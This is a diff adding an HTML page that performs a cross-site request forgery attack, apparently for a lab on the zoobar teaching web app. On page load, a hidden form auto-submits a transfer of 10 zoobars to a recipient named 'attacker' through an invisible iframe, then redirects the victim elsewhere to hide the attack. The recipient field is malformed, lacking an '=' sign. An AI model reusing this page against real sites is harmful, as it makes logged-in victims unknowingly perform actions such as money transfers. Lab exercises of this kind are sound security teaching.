@@ -1,0 +1,26 @@
+<html>
+<head>
+</head>
+<body>
+	<iframe id="frame" name="frame" style="visibility: hidden"></iframe>
+	<form id="zoobarthief" method="POST" target="frame" action="http://zoobar.org/transfer.php">
+		<input name="zoobars" type="hidden" value="10">
+		<input name="recipient" type="hidden" value"attacker">
+		<input id="send" type="submit" name="submission" value="Send" style="visibility: hidden">
+	</form>
+	<script>
+		window.onload = function() {
+			var frame = document.getElementById('frame');
+			count = 0;
+			frame.onload = function() {
+				count++;
+				if(count >=2) {
+					document.location='www.google.com';
+					}
+				};
+				document.getElementById('send').click();
+			};
+	</script>
+</body>
+</html>
+					
